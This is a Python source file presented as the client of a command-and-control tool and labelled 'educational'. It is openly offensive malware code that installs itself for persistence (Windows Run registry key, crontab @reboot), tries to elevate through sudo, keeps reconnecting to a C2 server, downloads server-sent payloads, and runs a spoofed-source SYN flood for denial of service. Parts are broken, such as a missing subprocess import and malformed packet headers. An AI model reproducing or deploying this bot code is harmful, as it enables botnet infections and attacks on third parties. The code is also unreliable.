# C4 Command And Control Tool [CLIENT]
# Written by: Lucas Rønnebro

# For educational purposes and research purposes only.
# For semi-documentation please refer to the readme.
# Enjoy the tool!!

import asyncio
import socket
import random
import ipaddress
import struct
import os
import sys
import winreg as reg
import ctypes

HOST = '127.0.0.1'  # Change this to the server's IP address if it's on a different machine
PORT = 12345

#? Starts out by checking if the worm already has registry keys, and admin
#? if it has, then exit
#? if it doesn't, then run the function, to gain admin, and save reg keys
def change_reg_keys():
    if os.name == "nt":
        #! Startup + admin priv for windows systems
        
        #? Set up keys and paths
        key = r"Software\Microsoft\Windows\CurrentVersion\Run"
        app_name = os.path.basename(sys.argv[0])
        app_path = os.path.abspath(sys.argv[0])
        reg_path = r"HKCU\{}".format(key)

        try:
            # Check if the registry key already exists
            reg_key = reg.OpenKey(reg.HKEY_CURRENT_USER, key, 0, reg.KEY_READ)
            value, regtype = reg.QueryValueEx(reg_key, app_name)
            reg.CloseKey(reg_key)

            # Check if the RunAsAdmin key already exists
            reg_key = reg.OpenKey(reg.HKEY_CURRENT_USER, key, 0, reg.KEY_READ)
            value, regtype = reg.QueryValueEx(reg_key, f"{app_name}_RunAsAdmin")
            reg.CloseKey(reg_key)

            print(f"{app_name} is already set to run on startup and as administrator.")
        except FileNotFoundError:
            try:
                # If the registry key doesn't exist, create it
                reg_key = reg.OpenKey(reg.HKEY_CURRENT_USER, key, 0, reg.KEY_SET_VALUE)
                reg.SetValueEx(reg_key, app_name, 0, reg.REG_SZ, app_path)
                reg.CloseKey(reg_key)

                # Check if the application has admin privileges
                if ctypes.windll.shell32.IsUserAnAdmin():
                    reg_key = reg.OpenKey(reg.HKEY_CURRENT_USER, key, 0, reg.KEY_SET_VALUE)
                    reg.SetValueEx(reg_key, f"{app_name}_RunAsAdmin", 0, reg.REG_SZ, "1")
                    reg.CloseKey(reg_key)

                    print(f"{app_name} has been set to run as administrator during startup.")
                else:
                    print(f"{app_name} will run on startup, but it doesn't have admin privileges.")
            except Exception as e:
                print(f"Error occurred: {e}")
    else:
        #! Startup + sudo priv for unix systems
        
        #? Get the script added to startup
        script_path = os.path.abspath(sys.argv[0])
        # Add the script to the user's crontab to run at startup
        cron_command = f'@reboot /usr/bin/python3 {script_path}\n'
        with open('/tmp/cron_job', 'w') as cron_file:
            cron_file.write(cron_command)
        subprocess.run(['crontab', '/tmp/cron_job'], check=True)
        os.remove('/tmp/cron_job')
        
        #? Make the script run with elevated privileges
        script_path = os.path.abspath(sys.argv[0])
        # Check if the script is already running with elevated privileges
        if os.geteuid() == 0:
            print("Already running with elevated privileges.")
        else:
            # Re-run the script using sudo to get elevated privileges
            sudo_command = f'sudo /usr/bin/python3 {script_path}'
            subprocess.run(sudo_command, shell=True, check=True)

#? Trying to connect to the server, if the connection fails, it tries over
async def try_connect_to_server():
    try:
        reader, writer = await asyncio.wait_for(asyncio.open_connection(HOST, PORT), timeout=5)
        print("Connected to the server")
        
        #Handle the command interface as an separate task
        await connected_to_server(reader)
        
        await try_connect_to_server()
        
    except (ConnectionRefusedError, TimeoutError):
        print("Couldn't connect to server, trying again in 2 seconds...")
        await try_connect_to_server()
    except Exception as e:
        print(f"Error occurred during comms with the server: {e}")
        await try_connect_to_server()

#? connected/commmands loop, basically the main loop, where it listens for commands
async def connected_to_server(reader:asyncio.StreamReader):
    while True:
        data = await reader.read(1024)
        if not data:
            break
        command = data.decode()
        print(command.split())
       
        if (command.split()[0] == "downloadfile"):
            await downloadfile(reader=reader, filename=command.split()[1], extension=command.split()[2])
        elif (command.split()[0] == "udpflood"):
            await syn_flood(target_ip=command.split()[1], target_port=command.split()[2])

#? Downloads the file sent by the server, could be used if you want to send malicious software, that auto runs
async def downloadfile(reader:asyncio.StreamReader, filename, extension):
    try:
        with open(f"{filename}{extension}", "wb") as f:
            while True:
                chunk = await reader.read(1024)
                if not chunk:
                    break
                f.write(chunk)
            print("File downloaded")
    except Exception as e:
        print(f"Error occurred: {e}")
    
#? Can be used for a DDos attack
async def syn_flood(target_ip, target_port):
    try:
        source_port = random.randint(1024, 65535)
        
        #Set up a raw socket, so we can specify our own IP and TCP Header
        raw_socket = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
        raw_socket.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        
        #Craft IP header
        source_ip = str(ipaddress.IPv4Address(random.randint(0, 2**32)))
        ip_header = b'\x45\x00\x00\x28' + b'\xab\xcd\x00\x00' + b'\x40\x06\x00\x00' + socket.inet_aton(source_ip) + socket.inet_aton(target_ip)
        
        #Craft TCP header
        syn_packet = b'\x00\x00' + struct.pack('!HH', source_port, int(target_port)) + b'\x00\x00\x00\x00\x00\x00\x00\x00\x50\x02\x00\x00' + b'\x00\x00\x00\x00'
        
        #Send SYN packet
        raw_socket.sendto(ip_header + syn_packet, (target_ip, int(target_port)))
        
        print("SYN packet sent")
    except Exception as e:
        print(f"Error sending SYN packet: {e}")

async def main():
    change_reg_keys()
    await try_connect_to_server()

if __name__ == "__main__":
    asyncio.run(main())
